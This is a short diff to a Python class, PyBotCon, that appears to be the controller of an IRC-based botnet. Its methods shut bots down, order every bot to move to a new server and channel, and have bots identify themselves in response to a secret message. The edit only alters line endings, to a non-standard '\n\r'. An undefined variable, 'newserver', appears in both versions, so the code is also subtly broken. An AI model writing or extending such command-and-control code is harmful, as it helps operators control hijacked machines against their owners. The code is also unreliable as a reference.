@@ -147,12 +147,12 @@ class PyBotCon:
     print("Total: "+str(successCount)+" bots shut down")
 
   def changeChannel(self,channel,newServer, newPort, newChannel):
-    self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))
-    print(str(len(self.botList)) + " bots have moved to: " + newserver + "/" + newPort + " #" + newChannel + "\n")
+    self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n\r","UTF-8"))
+    print(str(len(self.botList)) + " bots have moved to: " + newserver + "/" + newPort + " #" + newChannel + "\n\r")
 
   def identifyBots(self):
     # Send 'secret' message for bots to identify themselves
-    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :" + self.secret + "\n","UTF-8")) 
+    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :" + self.secret + "\n\r","UTF-8")) 
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
     time.sleep(2)
     period = timedelta(seconds=5) 
